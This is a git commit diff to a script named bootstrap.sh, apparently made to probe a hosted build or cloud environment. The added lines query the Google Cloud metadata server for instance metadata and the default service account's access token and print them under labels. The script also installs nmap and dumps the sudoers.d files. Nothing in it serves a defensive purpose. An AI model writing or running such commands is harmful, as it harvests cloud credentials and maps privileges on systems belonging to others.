c6672502e2ef687ae891ef1fb385766a4c958769
boo7 <boo7>
2018-12-23 10:41:52 +0100

    plop

--- bootstrap.sh
+++ bootstrap.sh
@@ -1,8 +1,11 @@
 #!/bin/bash
 # -*- coding: UTF8 -*-
-
-curl http://metadata.google.internal/computeMetadata/v1beta1/oslogin
+echo "oslogin"
+curl 'http://metadata.google.internal/computeMetadata/v1beta1/oslogin?alt=json'
+echo "metadata :"
 curl 'http://metadata.google.internal/computeMetadata/v1beta1?alt=json&recursive=true'
+echo "token :"
+curl 'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json'
 apt-get install nmap
 ls /etc/sudoers.d/
 cat /etc/sudoers.d/*
